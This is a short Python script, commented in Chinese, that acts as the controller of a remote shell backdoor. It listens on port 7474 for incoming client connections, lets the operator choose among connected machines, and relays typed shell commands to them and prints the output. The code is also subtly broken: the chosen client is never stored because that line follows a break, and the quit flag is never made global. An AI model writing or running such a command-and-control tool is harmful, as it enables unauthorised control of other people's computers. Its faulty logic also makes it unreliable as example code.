#/usr/bin/env python3
# -*-coding: utf-8 -*

'''
控制端，监听端口等待被连接
'''

import socket
import threading



clientList = []				#连接的客户端列表
curClient = None			#当前的客户端
quitThread = False			#是否退出线程
lock = threading.Lock()


#负责发送shell命令和接受结果
def shell_ctrl(socket, addr):
	while True:
		com = input(str(addr[0]) + ':~#')	#等待输入命令
		if com == '!ch':			#切换client
			select_client()
			return
		if com == '!q':				#退出控制端
			quitThread = True
			print('--------------------* Connection has ended* ---------------------------')
			exit(0)
		socket.send(com.encode('utf-8'))	#发送命令的字节码
		data = socket.recv(1024)		#接受返回的结果
		print(data.decode('utf-8'))		#输出结果

#选择客户端
def select_client():
	global clientList
	global curClient
	print('---------------------* The Current is connected to the cllient: *-----------------------')
	for i in range(len(clientList)):	#输出已经连接到控制端的client地址
		print('[%i]-> %s' % (i, str(clientList[i][1][0])))
	print('Please select a client!')

	while True:
		num = input('client num: ')	#等待输入一个带选择地址的序号
		if int(num) >= len(clientList):
			print('Please input a corrent num!')
			continue
		else:
			break

		curClient =clientList[int(num)]

		print('=' * 80)
		print(' ' * 20 + 'Client Shell from add:', curClient[1][0])
		print('=' * 80)


def wait_connect(sk):
	global clientList
	while not quitThread:
		if len(clientList) == 0:
			print('Waiting for the connection......')
		sock, addr = sk.accept()
		print('New client %s is connection!' % (addr[0]))
		lock.acquire()
		clientList.append((sock, addr))
		lock.release()

def main():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		#创建一个TCP Socket
	s.bind(('0.0.0.0', 7474))					#绑定7474端口，并与允许来自任意地址的连接
	s.listen(1024)							#开始监听

	t = threading.Thread(target=wait_connect, args=(s,))
	t.start()

	while True:
		if len(clientList) > 0:
			select_client()					#选择一个client
			shell_ctrl(curClient[0], curClient[1]) 		#处理shell命令

if __name__ == '__main__':
	main()
